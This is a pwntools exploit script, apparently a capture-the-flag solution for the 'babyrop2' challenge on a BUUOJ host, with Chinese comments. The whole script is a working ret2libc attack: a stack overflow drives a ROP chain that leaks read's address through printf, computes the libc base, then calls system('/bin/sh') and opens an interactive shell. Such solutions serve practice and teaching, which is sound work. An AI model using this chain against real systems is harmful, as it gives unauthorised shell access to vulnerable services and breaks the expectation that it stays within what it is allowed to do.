from pwn import *

r = remote('node5.buuoj.cn', 25761)
elf = ELF(r'../../pwn_file/babyrop2')
libc = ELF(r'../libc/libc.so.6')

context.log_level = 'debug'

pop_rdi = 0x400733  # 用于设置第一个参数： %s
pop_rsi_r15 = 0x400731  # 用于设置第二个参数：read_got，注意这里还有一个pop r15，我们要多加一个参数给他
printf_str_addr = 0x400770  # 'Welcome to the Pwn World again, %s!\n'
ret_addr = 0x4004d1

main_addr = elf.sym['main']
read_plt = elf.plt['read']
read_got = elf.got['read']
printf_plt = elf.plt['printf']  # 0x4004F0

# 泄漏read函数地址
payload = b'A' * (0x20 + 0x8) + p64(pop_rdi) + p64(printf_str_addr) + p64(pop_rsi_r15) + p64(read_got) + p64(0) + p64(printf_plt) + p64(main_addr)
r.sendafter(b"What's your name? ", payload)
# r.recvuntil(b'again, ')
read_addr = u64(r.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))  # 0x7f531e57d250
print(hex(read_addr))

base_addr = read_addr - libc.sym['read']
system_addr = base_addr + libc.sym['system']
sh_addr = base_addr + libc.search(b'/bin/sh').__next__()

# 构造system rop
payload2 = b'A' * (0x20 + 0x8) + p64(ret_addr) + p64(pop_rdi) + p64(sh_addr) + p64(system_addr)
r.sendafter(b"What's your name? ", payload2)
r.interactive()